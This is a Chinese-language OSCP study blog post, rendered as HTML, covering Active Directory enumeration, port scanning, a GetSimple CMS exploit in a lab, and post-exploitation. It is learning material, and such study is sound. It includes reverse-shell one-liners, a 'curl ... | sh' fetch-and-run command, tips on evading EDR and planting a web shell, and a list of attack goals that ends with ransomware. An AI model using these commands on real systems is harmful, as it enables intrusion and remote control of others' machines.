@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Tr0y2ooo">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/12/25/oscp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OSCP前導AD Security什麼是AD?微軟的 Windows Server 中，負責架構中大型網路環境的集中式目錄管理服務（Directory Services），它處理在組織中的網路物件，物件可以是使用者、群組、電腦、網域控制站、郵件、設定檔、組織單元、樹系等等，只要是在Active Directory結構定義檔（schema）中定義的物件，就可以儲存在Active Directory資">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCP">
+<meta property="og:url" content="http://example.com/2024/12/25/OSCP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="OSCP前導AD Security什麼是AD?微軟的 Windows Server 中，負責架構中大型網路環境的集中式目錄管理服務（Directory Services），它處理在組織中的網路物件，物件可以是使用者、群組、電腦、網域控制站、郵件、設定檔、組織單元、樹系等等，只要是在Active Directory結構定義檔（schema）中定義的物件，就可以儲存在Active Directory資">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJaIf74f1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkiIQmVM1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ry48XtNG1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJ1GNYVfJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hkp4dYVG1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1iqYD4Qkg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S11EqwVXyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sk6jqPV7yg.png">
+<meta property="article:published_time" content="2024-12-24T17:46:00.000Z">
+<meta property="article:modified_time" content="2024-12-24T17:52:56.247Z">
+<meta property="article:author" content="Troy">
+<meta property="article:tag" content="OSCP">
+<meta property="article:tag" content="Penetration Testing">
+<meta property="article:tag" content="AD">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/BJaIf74f1g.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/null" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/null">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/null">
+    <!--- Page Info-->
+    
+    <title>
+        
+            OSCP | Tr0y2ooo in the house
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/rem.jpg","dark":"/images/rem_dark.jpg"},"title":"‎‎‎‏‎‏‎‏","subtitle":{"text":null,"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"幹你娘","artist":"DJ Jerry","url":"https://ssl-pixnet-tv.pixfs.net/user/leo4/1231657490.m4a","cover":"https://media.discordapp.net/attachments/850438898093785128/1262046151520161835/1720574532076.gif?ex=67340852&is=6732b6d2&hm=a84a4a8bdeae5d7d34f0a8a1ccc339a001a624eb6ff490d5fd18cb35e0a49b84&=","lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/EvanNotFound/hexo-theme-redefine","Blog":"https://ohevan.com"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3,"Tags":null,"icon":"fa-solid fa-tags","path":"/tags/"}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Tr0y2ooo in the house
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/EvanNotFound/hexo-theme-redefine">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://ohevan.com">
+                                                    BLOG
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/EvanNotFound/hexo-theme-redefine">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://ohevan.com">BLOG</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">OSCP</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/personal.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Troy</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-12-25 01:46</span>
+        <span class="mobile">2024-12-25 01:46</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-12-25 01:52:56</span>
+            <span class="mobile">2024-12-25 01:52:56</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/tutorial/">tutorial</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/tutorial/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/OSCP/">OSCP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Penetration-Testing/">Penetration Testing</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/AD/">AD</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="OSCP前導AD-Security"><a href="#OSCP前導AD-Security" class="headerlink" title="OSCP前導AD Security"></a>OSCP前導AD Security</h2><h3 id="什麼是AD"><a href="#什麼是AD" class="headerlink" title="什麼是AD?"></a>什麼是AD?</h3><p>微軟的 Windows Server 中，負責架構中大型網路環境的集中式目錄管理服務<br>（Directory Services），它處理在組織中的網路物件，物件可以是使用者、群組、電腦、網<br>域控制站、郵件、設定檔、組織單元、樹系等等，只要是在Active Directory結構定義檔<br>（schema）中定義的物件，就可以儲存在Active Directory資料檔中，並利用Active Directory<br>Service Interface來存取</p>
+<p>這個結構只要我打到最上層的核心AD，我就可以管理所有電腦</p>
+<p>AD(Active Directory)是一種架構，實際上在操控的是DC(Domain Controller)跟RODC(Read-Only Domain Controller)，RODC可以在無法連上DC網路的時候離線存取快取，也能阻擋一些駭客攻擊，是可以放在外網的物件</p>
+<h4 id="AD-user"><a href="#AD-user" class="headerlink" title="AD user"></a>AD user</h4><p>分成本地user(目前在用的主機)跟網域user<br>如果你在AD架構下想使用本地帳號只要在使用者名稱前面加上.\就可以以本地帳號登入電腦，或是用電腦名稱{user}</p>
+<p>想登入AD網域的話就是直接打網域{user}就可以了</p>
+<p>本地使用者帳號跟網域使用者帳號一樣是有可能的，但他們其實是不同的帳號<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BJaIf74f1g.png"
+                      alt="image"
+                ></p>
+<p>那你登入後會在AD server的C槽的Users底下，這邊有一個重點，如果你查資料夾沒有Administrator，就表示管理員沒來過這台電腦，那你也不用浪費時間打這台機器了，這張圖片.FUGUE就是Domain的帳號<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HkiIQmVM1e.png"
+                      alt="image"
+                ></p>
+<p>那你也可以直接查看電腦的內容去看他的網域是多少，去判斷他是AD還是本地</p>
+<p>在這個架構下的電腦會分成<br>Local區段跟Domain區段，Domain區段下面不會有使用者，使用者資訊都存在Server端，所以你登Domain帳號的時候他會去AD Domain存取你的使用者資訊</p>
+<h4 id="查詢本地使用者"><a href="#查詢本地使用者" class="headerlink" title="查詢本地使用者"></a>查詢本地使用者</h4><p>可以用指令:</p>
+<ul>
+<li>net user - 查看有哪些使用者</li>
+<li>net user &lt;Username&gt; - 顯示該使用者的詳細資料</li>
+</ul>
+<p>可以根據帳戶是否使用中去決定要不要打這台，如果帳戶使用中是no，那妳可以先不用找他，他可能是存在但是沒在用的帳號，上次設定密碼時間如果是很久以前，表示他很久沒有改密碼，那你可以挖看看社工庫，會有很大機率撈到他的密碼。</p>
+<h4 id="查詢Domain-User"><a href="#查詢Domain-User" class="headerlink" title="查詢Domain User"></a>查詢Domain User</h4><ul>
+<li>net user &#x2F;domain</li>
+<li>net user &lt;username&gt; &#x2F;domain</li>
+</ul>
+<p>要注意註解的部分，註解會有一些重要資訊<br>業界傳說：職位越高的主管密碼越弱</p>
+<h4 id="查詢網域群組"><a href="#查詢網域群組" class="headerlink" title="查詢網域群組"></a>查詢網域群組</h4><ul>
+<li>net groups &#x2F;domain</li>
+<li>net groups “Domain Admins” &#x2F;domain</li>
+<li>net groups “Schema Admins” &#x2F;domain</li>
+<li>net groups “Enterprise Admins” &#x2F;domain</li>
+</ul>
+<p>這些都很重要，都是值得打的目標</p>
+<p>一些特殊群組 ：</p>
+<ul>
+<li>Remote Desktop Users<ul>
+<li>能夠 RDP 所有主機</li>
+</ul>
+</li>
+<li>Group Policy Creator Owners<ul>
+<li>能夠用 GPO 搞事</li>
+</ul>
+</li>
+<li>Server Operators<ul>
+<li>可以備份 DC</li>
+</ul>
+</li>
+<li>DNSAdmins<ul>
+<li>可以在 DC 上跑 DLL</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/" >https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+</li>
+<li>Backup Operators<ul>
+<li>可以備份 DC</li>
+</ul>
+</li>
+<li>Print Operators<ul>
+<li>重開任何主機</li>
+</ul>
+</li>
+</ul>
+<h3 id="網域下的電腦"><a href="#網域下的電腦" class="headerlink" title="網域下的電腦"></a>網域下的電腦</h3><p>預設C槽是共享的，Domain Admin 可以直接存取C槽<br>\&lt;ip&gt;\C$</p>
+<p>怎麼知道我的AD server是哪一台<br>可以用<br>echo %logonserver%<br>nltest &#x2F;dclist:<domain><br>小技巧DC跟DNS通常是同一台，所以nslookup也大概可以查到</p>
+<h3 id="目標偵查"><a href="#目標偵查" class="headerlink" title="目標偵查"></a>目標偵查</h3><p>OSINT:<br>    * Google Hacking<br>    * Robots.txt<br>    * WPScan(專門針對wordpress的掃描工具)<br>    * Wappalyzer<br>    * port scan<br>        * nmap <ip> - 基本用法<br>        * nmap -T4 <IP> - 需要較高的網路，他會提高速度(企業內網直接用這個command)<br>        * nmap -T4 -Pn <IP> - 先ping主機，主機有回才會開掃，缺點是每一台都掃<br>        * nmap -T4 -Pn -p- <IP> - 掃所有port<br>        * nmap -T4 -Pn -p- -A <IP> - 自動偵測，好用但是動作很大花很多時間<br>        * 掃 Port 順序:<br>            1. 一般服務 (HTTP, HTTPS)80&#x2F;443<br>            2. 管理服務 (22, 3389)<br>            3. 常見 Port (Top 1000)<br>            4. 全掃<br>        * 如果真的要掃全port用其他工具比較快，nmap詳細但是很慢<br>        * 不要忘記掃127.0.0.1，不只外網可以掃，內網也可以掃<br>        * 內網常常會有奇怪的服務，例如遊戲橘子會開服務在內網然後request他去開遊戲，這種服務通常是最高權限<br>    * 目錄爆破(我們跟專業滲透師差在字典檔XDD)<br>        * dirb <url><br>        * dirb <url> -X .zip&#x2F;.7z&#x2F;.rar</p>
+<h2 id="弱點利用"><a href="#弱點利用" class="headerlink" title="弱點利用"></a>弱點利用</h2><ul>
+<li>找現成的<a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/" >Exploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，但是Exploit有可能是錯誤的，可能要自己改PoC或是調整版本。</li>
+</ul>
+<p>舉例:<a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51475" >GetSimple CMS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>有打勾勾看起來是很穩定的PoC<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/ry48XtNG1l.png"
+                      alt="image"
+                ><br>看一下內容，可以猜出v&#x3D;他的版本，並且版本要小於等於3.3.16</p>
+<p>去看靶機的admin.php發現裡面寫3.3.17，不要太早下結論，看到版本更新就不打<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJ1GNYVfJl.png"
+                      alt="image"
+                ><br>可以猜到她是要開reverse shell 到 <a class="link"   href="ip:port" >ip:port <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<username>可能要猜一下，看是誰在發文管理可能就是他了</p>
+<ul>
+<li>不開Reverse shell<ul>
+<li>可能獲取RDP&#x2F;SSH帳號-&gt;需要有開這些服務才能用</li>
+<li>密碼可能被hash</li>
+<li>RDP登進去很明顯，正在使用的管理員會被踢出並且顯示有人正在登入，SSH也會顯示登入的IP</li>
+</ul>
+</li>
+<li>開Reverse shell<ul>
+<li>不用開port在主機上<ul>
+<li>不怕防火牆</li>
+</ul>
+</li>
+<li>幾乎所有系統都能開</li>
+<li>有一堆好用工具<ul>
+<li>Msfvenom,meterpreter,cobalt-strike,bash,socat,nc</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="簡單彈shell-command"><a href="#簡單彈shell-command" class="headerlink" title="簡單彈shell command"></a>簡單彈shell command</h3><pre><code>* nc -e /bin/bash IP PORT
+* bash -c &#39;bash -i&gt;&amp; /dev/IP/PORT 0&gt;&amp;1&#39;
+</code></pre>
+<ul>
+<li><p>但是<a class="link"   target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" >cheatsheet <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>更香</p>
+</li>
+<li><p>這個<a class="link"   target="_blank" rel="noopener" href="https://reverse-shell.sh/yourip:port" >service <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>更香</p>
+<ul>
+<li>curl <a class="link"   target="_blank" rel="noopener" href="https://reverse-shell.sh/192.168.0.69:1337" >https://reverse-shell.sh/192.168.0.69:1337 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> | sh</li>
+<li>它會自動幫你判斷、彈shell</li>
+</ul>
+</li>
+</ul>
+<h3 id="Reverse-shell怎麼接"><a href="#Reverse-shell怎麼接" class="headerlink" title="Reverse shell怎麼接"></a>Reverse shell怎麼接</h3><ul>
+<li>Linux<ul>
+<li>nc -nvlp <port></li>
+</ul>
+</li>
+<li>Windows<ul>
+<li>後門RAT(Msfvenom)</li>
+<li>PowerShell</li>
+</ul>
+</li>
+</ul>
+<h3 id="跑exploit"><a href="#跑exploit" class="headerlink" title="跑exploit"></a>跑exploit</h3><ul>
+<li>python 51475.py <IP> <PATH> <Kali IP>:<Reverse Shell Port> <USERNAME></li>
+<li>python 51475.py 172.31.2.1:8787 admin<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/Hkp4dYVG1e.png"
+                      alt="image"
+                ></li>
+</ul>
+<p>會發現”This is not vulnrable to this CVE”，但後面又顯示”Webshell trigged sucessfully!”<br>其實是因為他可能像是改記事本改版本，實際上還是vulnrable的版本，這個PoC還可以不會因為版本不讓你跑，有的可能不讓你跑，你要自己改exploit可能改判斷的condition之類的，或是說知道原理可以直接跑不用判斷版本直接讓腳本跑起來。</p>
+<p>成功彈完shell後，也接到shell後，開始要問自己”我是誰、我在哪、我要幹啥”</p>
+<h4 id="我是誰"><a href="#我是誰" class="headerlink" title="我是誰"></a>我是誰</h4><p>先確認我是誰，在linux中下whoami後如果uid跟gid都是0，使用者名稱是root，那你就是成功提到最高權限了；windows也可以下whoami，使用者名稱會是NT AUTHORITY\SYSTEM</p>
+<p>現在打whoami其實很危險，因為正常不會有人打這個指令，EDR或是一些資安軟體都會觸發警報，一個簡單的方法可以解決，就是找一個可以寫入的目錄隨便寫一個檔案，看owner是誰，就知道了，練習環境是沒差直接打就好了。</p>
+<p>windows的架站軟體xampp，用的是最高權限的nt system，如果在127.0.0.1掃到xampp直接打開C槽找到htdoc&#x2F;直接右鍵新增文件，手寫shell就直接打進去了，或是到php admin寫一個shell</p>
+<h4 id="我在哪"><a href="#我在哪" class="headerlink" title="我在哪"></a>我在哪</h4><ul>
+<li>hostname：電腦的名稱</li>
+<li>uname -a: 系統的核心版本</li>
+<li>ps aux &#x2F; top：電腦的執行 process</li>
+<li>ifconfig &#x2F; ip a：電腦的網路資訊</li>
+<li>pwd：當前的資料夾</li>
+<li>w：登入的 TTY 資訊</li>
+<li>cat &#x2F;etc&#x2F;passwd：電腦中的使用者資訊</li>
+</ul>
+<h4 id="我要幹什麼"><a href="#我要幹什麼" class="headerlink" title="我要幹什麼"></a>我要幹什麼</h4><ul>
+<li>了解電腦資訊、使用者資訊</li>
+<li>探索網路環境 (nmap、powershell掃port之類的)</li>
+<li>擬定攻擊行為<ul>
+<li>尋找提權機會</li>
+<li>竊取竄改資料</li>
+<li>持續移動</li>
+<li>橫向移動</li>
+<li>ransomeware?</li>
+</ul>
+</li>
+</ul>
+<h4 id="回到exploit"><a href="#回到exploit" class="headerlink" title="回到exploit"></a>回到exploit</h4><p>去打8080下的admin<br>python 51475.py 172.31.11.25:8080 &#x2F; 172.31.2.1:8787 admin</p>
+<p>result:(-)could not get version</p>
+<p>手動去確認<code>172.31.11.25:8080/admin</code><br>原來是這個頁面被搬家，所以找不到版本，PoC無法成功打進去</p>
+<p>這時候就請出dirb去掃</p>
+<p>掃到<br>backend&#x2F;<br>backups&#x2F;</p>
+<p>那就稍微修改一下exploit，把admin改成backend<br><img  
